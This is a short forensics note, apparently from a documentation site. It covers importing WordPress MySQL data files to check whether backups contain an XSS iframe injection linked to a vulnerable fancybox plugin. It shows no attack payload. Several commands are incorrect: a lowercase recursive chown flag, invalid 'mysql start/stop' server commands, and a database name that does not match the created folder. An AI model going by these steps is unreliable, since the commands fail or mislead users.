    "content": "# Analysing XSS injection in MYD Copying the MYD files on csirt-sans-sift - Create a new folder in /var/lib/mysql/database-name and give to database-name the name you want: ``` sudo mkdir /var/lib/mysql/springfield ``` - Upload the files in the created new folder with WinSCP - Change the linux owner permissions for those files to mysql:mysql: ``` sudo chown mysql:mysql -r /var/lib/mysql/springfield/ ``` # Starting MySQL server Run the command ``` sudo mysql start -u root -p ``` Launch mysql client as per below : ``` mysql > use acme; mysql > exit ``` # Querying imported MYD files Based on timestamps of the XSS attack on the ACME website via WordPress, we had to check if the MySQL backups were sain. We parsed for the iframe injection in the table hbrhui used by the fancybox vulnerable plugin (Sucuri Article). ``` mysql > SELECT option_value FROM wp_hbrhui_options WHERE CHAR_LENGTH(option_value) > 50 INTO OUTFILE '/tmp/dump_20_option_name.txt'; ``` Greping for URL of redirection, we proof the backup is compromised. ![XSS in MYD](/docs/forensics/wordpress-xss-injection.png) # Stopping MySQL server Run the command: ``` sudo mysql stop ``` ",
    "url": "/docs/forensics/wordpress-xss.injection.html",
    "relUrl": "/docs/forensics/wordpress-xss.injection.html"
  }
}
